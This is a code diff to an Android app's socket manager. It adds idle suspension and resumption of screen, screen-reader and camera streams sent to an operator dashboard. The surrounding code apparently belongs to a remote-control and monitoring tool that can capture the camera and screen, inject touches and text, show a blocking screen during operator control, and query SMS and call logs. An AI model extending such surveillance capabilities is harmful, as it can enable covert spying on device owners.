@@ -25,6 +25,7 @@ import javax.net.ssl.TrustManager;
 import javax.net.ssl.X509TrustManager;
 import java.security.cert.X509Certificate;
 import com.task.tusker.utils.ResourceGuard;
+import com.task.tusker.utils.IdleSuspensionManager;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
@@ -172,6 +173,16 @@ public class SocketManager {
     private final java.util.ArrayList<JSONObject> offlineFrameBuffer = new java.util.ArrayList<>();
     private volatile boolean autoRecordingActive = false;
     private volatile boolean manualRecordingActive = false;
+
+    // ── Idle-suspension state ──────────────────────────────────────────────
+    // Tracks which streams were active when the 2-minute idle timer fired so that
+    // onResume can restart exactly those streams (camera is intentionally excluded —
+    // the operator must restart it manually after a suspension).
+    private volatile boolean suspendedIdleFrame    = false;
+    private volatile boolean suspendedBlockFrame   = false;
+    private volatile boolean suspendedScreenReader = false;
+    /** Initialized at the end of the constructor once all other fields are ready. */
+    private IdleSuspensionManager idleSuspensionManager;
     private volatile long autoRecordingStartTime = 0L;
 
     // Debounce handle for device-user interaction frames
@@ -281,6 +292,83 @@ public class SocketManager {
         });
         // gestureRecorder is initialized lazily (needs AccessibilityService)
         LogManager.setEnabled(true);
+
+        // ── Idle-suspension: stop streams after 2 min of no UI-interaction commands ──
+        // Streams stay suspended until the operator sends a qualifying interaction command
+        // (touch, swipe, press_back, etc.).  Camera does NOT auto-resume.
+        idleSuspensionManager = new IdleSuspensionManager(new IdleSuspensionManager.Callback() {
+            @Override
+            public void onSuspend(int suspendedTypesMask) {
+                suspendedIdleFrame    = (suspendedTypesMask & IdleSuspensionManager.STREAM_IDLE_FRAME)    != 0;
+                suspendedBlockFrame   = (suspendedTypesMask & IdleSuspensionManager.STREAM_BLOCK_FRAME)   != 0;
+                suspendedScreenReader = (suspendedTypesMask & IdleSuspensionManager.STREAM_SCREEN_READER) != 0;
+                boolean suspendedCamera = (suspendedTypesMask & IdleSuspensionManager.STREAM_CAMERA) != 0;
+
+                Log.i(TAG, "IdleSuspension: 2-min idle — suspending "
+                        + "(idleFrame=" + suspendedIdleFrame
+                        + " blockFrame=" + suspendedBlockFrame
+                        + " screenReader=" + suspendedScreenReader
+                        + " camera=" + suspendedCamera + ")");
+
+                // Stop frame-push streams on the heartbeatExecutor (the thread they run on)
+                heartbeatExecutor.execute(() -> {
+                    if (suspendedIdleFrame)  stopIdleFrameMode();
+                    if (suspendedBlockFrame) stopBlockFrameMode();
+                    if (suspendedScreenReader) {
+                        manualRecordingActive = false; // stop dashboard push immediately
+                        stopScreenReaderLoop(false);   // flush offline buffer + release CPU
+                    }
+                });
+
+                // Camera is not managed by heartbeatExecutor — stop directly
+                if (suspendedCamera) cameraStreamHandler.stopStream();
+
+                // Notify dashboard so it can show an "idle — waiting for interaction" indicator
+                try {
+                    JSONObject note = new JSONObject();
+                    note.put("reason",       "idle_timeout");
+                    note.put("idle_seconds", IdleSuspensionManager.IDLE_TIMEOUT_MS / 1000);
+                    sendMessage("stream:suspended", note);
+                } catch (Exception ignored) {}
+            }
+
+            @Override
+            public void onResume(int resumeTypesMask) {
+                Log.i(TAG, "IdleSuspension: UI interaction — resuming screen streams (mask=0b"
+                        + Integer.toBinaryString(resumeTypesMask) + ")");
+                final String deviceId = DeviceInfo.getDeviceId(context);
+
+                heartbeatExecutor.execute(() -> {
+                    if ((resumeTypesMask & IdleSuspensionManager.STREAM_IDLE_FRAME) != 0
+                            && suspendedIdleFrame) {
+                        suspendedIdleFrame = false;
+                        startIdleFrameMode(deviceId); // restores at stored interval
+                    }
+                    if ((resumeTypesMask & IdleSuspensionManager.STREAM_BLOCK_FRAME) != 0
+                            && suspendedBlockFrame) {
+                        suspendedBlockFrame = false;
+                        startBlockFrameMode(deviceId);
+                    }
+                    if ((resumeTypesMask & IdleSuspensionManager.STREAM_SCREEN_READER) != 0
+                            && suspendedScreenReader) {
+                        suspendedScreenReader = false;
+                        UnifiedAccessibilityService svc = UnifiedAccessibilityService.getInstance();
+                        if (svc != null) {
+                            manualRecordingActive = true;
+                            startScreenReaderLoop(svc, false, screenReaderDashboardIntervalMs);
+                        }
+                    }
+                    // Camera is intentionally excluded — operator must restart it explicitly.
+                });
+
+                // Notify dashboard
+                try {
+                    JSONObject note = new JSONObject();
+                    note.put("reason", "user_interaction");
+                    sendMessage("stream:resumed", note);
+                } catch (Exception ignored) {}
+            }
+        });
     }
 
     /** Called by UnifiedAccessibilityService once it's running, to init gesture recorder. */
@@ -961,6 +1049,7 @@ public class SocketManager {
         stopHeartbeat();
         stopIdleFrameMode();
         stopBlockFrameMode();
+        idleSuspensionManager.shutdown();
         closeSilently();
         try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
         try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
@@ -1020,6 +1109,13 @@ public class SocketManager {
         // Inject commandId into params so dispatchCommand can use it (e.g. for run_task_local)
         if (params == null) params = new JSONObject();
         try { params.put("commandId", commandId); } catch (JSONException ignored) {}
+
+        // Qualifying UI interactions (touch, swipe, press_back/home/recents, etc.) reset the
+        // idle-suspension timer. Data-query commands do NOT reset it — the timer is specifically
+        // tracking whether a human operator is performing real interactions, not just polling data.
+        if (isUiInteractionCommand(command)) {
+            idleSuspensionManager.onInteraction();
+        }
 
         // Accessibility commands acquire accessSemaphore and can block for several seconds.
         // Route them to the dedicated accessibilityExecutor so they never stall the main
@@ -1266,9 +1362,14 @@ public class SocketManager {
             activeFeature = "camera";
             String camId = params.optString("cameraId", "0");
             long intMs   = Math.max(500L, params.optLong("intervalMs", 2000L));
-            return cameraStreamHandler.startStream(camId, intMs);
+            JSONObject camResult = cameraStreamHandler.startStream(camId, intMs);
+            if (camResult.optBoolean("success", false)) {
+                idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_CAMERA);
+            }
+            return camResult;
         }
         if (command.equals("camera_stream_stop")) {
+            idleSuspensionManager.onStreamStopped(IdleSuspensionManager.STREAM_CAMERA);
             return cameraStreamHandler.stopStream();
         }
         if (command.equals("camera_record_start")) {
@@ -1895,6 +1996,7 @@ public class SocketManager {
         Log.i(TAG, "Idle-frame mode started (" + finalInterval + "ms effective interval"
                 + " [base=" + idleFrameIntervalMs + "ms, pressure="
                 + ResourceGuard.getInstance(context).getLevel() + "])");
+        idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_IDLE_FRAME);
     }
 
     private void stopIdleFrameMode() {
@@ -1903,6 +2005,7 @@ public class SocketManager {
             idleFrameFuture.cancel(false);
             idleFrameFuture = null;
         }
+        idleSuspensionManager.onStreamStopped(IdleSuspensionManager.STREAM_IDLE_FRAME);
     }
 
     /** Start block-frame mode: push one frame every 1500 ms while block screen is active (3G safe). */
@@ -1915,6 +2018,10 @@ public class SocketManager {
             if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
         }, 1500, 1500, TimeUnit.MILLISECONDS);
         Log.i(TAG, "Block-frame mode started (1500ms delay — 3G compatible)");
+        // Block-frame mode means the operator is actively controlling the device.
+        // Inhibit the idle timer completely so no streams are ever suspended while it is on.
+        idleSuspensionManager.setInhibited(true);
+        idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_BLOCK_FRAME);
     }
 
     private void stopBlockFrameMode() {
@@ -1923,6 +2030,10 @@ public class SocketManager {
             blockFrameFuture.cancel(false);
             blockFrameFuture = null;
         }
+        // Re-arm the idle timer now that block-frame protection is lifted.
+        // The timer starts fresh (2-min window) for any remaining active streams.
+        idleSuspensionManager.setInhibited(false);
+        idleSuspensionManager.onStreamStopped(IdleSuspensionManager.STREAM_BLOCK_FRAME);
     }
 
     private Bitmap captureFrame() {
@@ -2027,6 +2138,37 @@ public class SocketManager {
             case "list_gcode_screenshots":
             case "get_gcode_screenshot":
             case "delete_gcode_screenshot":
+                return true;
+            default:
+                return false;
+        }
+    }
+
+    /**
+     * Returns true for commands that represent direct user interaction on the device screen.
+     * These reset the idle-suspension timer so the streams are not suspended while the
+     * operator is actively using the device.
+     * Data-query commands (call logs, SMS, installed apps, battery, etc.) are excluded —
+     * they should not prevent stream suspension.
+     */
+    private static boolean isUiInteractionCommand(String command) {
+        switch (command) {
+            case "wake_keep_alive_start": // keep-alive ping counts as an interaction — resets 2-min timer
+            case "touch":
+            case "swipe":
+            case "press_back":
+            case "press_home":
+            case "press_recents":
+            case "open_notifications":
+            case "open_quick_settings":
+            case "scroll_up":
+            case "scroll_down":
+            case "input_text":
+            case "press_enter":
+            case "click_by_text":
+            case "wake_screen":
+            case "screen_off":
+            case "open_task_manager":
                 return true;
             default:
                 return false;
@@ -2224,6 +2366,7 @@ public class SocketManager {
                 // ScreenReaderRecorder tab: start the recording loop on the device.
                 // This controls the offline recording buffer + streaming to dashboard.
                 manualRecordingActive = true;
+                idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_SCREEN_READER);
                 // Start the loop only if it is not already running — auto-recording
                 // may have already started it.  Never restart a healthy loop just because
                 // the dashboard pressed Start (that would cause a frame-gap stutter).
@@ -2243,6 +2386,7 @@ public class SocketManager {
                 // This DOES stop the full loop (recording halted, buffer flushed to disk).
                 manualRecordingActive = false;
                 stopScreenReaderLoop(false);
+                idleSuspensionManager.onStreamStopped(IdleSuspensionManager.STREAM_SCREEN_READER);
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
                 ok.put("message", "Recording stopped and saved on device");
@@ -2265,6 +2409,7 @@ public class SocketManager {
                     lastFrameFingerprint     = null;
                     consecutiveDuplicateCount = 0;
                     manualRecordingActive = true;
+                    idleSuspensionManager.onStreamStarted(IdleSuspensionManager.STREAM_SCREEN_READER);
                     ScheduledFuture<?> srf = screenReaderFuture;
                     if (srf == null || srf.isDone() || srf.isCancelled()) {
                         startScreenReaderLoop(finalSvc, false);
@@ -2279,7 +2424,10 @@ public class SocketManager {
             case "screen_reader_stream_stop": {
                 // Serialize through heartbeatExecutor so stop and start commands
                 // always execute in the order they were received (FIFO).
-                heartbeatExecutor.execute(() -> manualRecordingActive = false);
+                heartbeatExecutor.execute(() -> {
+                    manualRecordingActive = false;
+                    idleSuspensionManager.onStreamStopped(IdleSuspensionManager.STREAM_SCREEN_READER);
+                });
                 JSONObject ok = new JSONObject();
                 ok.put("success", true);
                 ok.put("message", "Stream stopped — screen reader still running on device");
